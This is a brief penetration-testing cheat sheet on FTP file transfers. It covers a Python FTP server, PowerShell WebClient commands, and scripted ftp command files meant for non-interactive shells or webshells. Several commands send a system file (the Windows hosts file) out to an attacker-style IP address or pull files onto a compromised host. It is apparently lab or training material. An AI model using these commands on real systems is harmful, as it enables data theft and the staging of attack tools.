# FTP File Transfers

## Python FTP Server

```bash
sudo pip3 install pyftpdlib

# Download server (anonymous, read-only)
sudo python3 -m pyftpdlib --port 21

# Upload server (anonymous, write-enabled)
sudo python3 -m pyftpdlib --port 21 --write
```

---

## PowerShell FTP Download

```powershell
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

## PowerShell FTP Upload

```powershell
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

---

## FTP Command File (Non-Interactive Shell)

When you only have a non-interactive shell (webshell, etc.), write FTP commands to a file and execute.

### Download

```cmd
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

### Upload

```cmd
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```
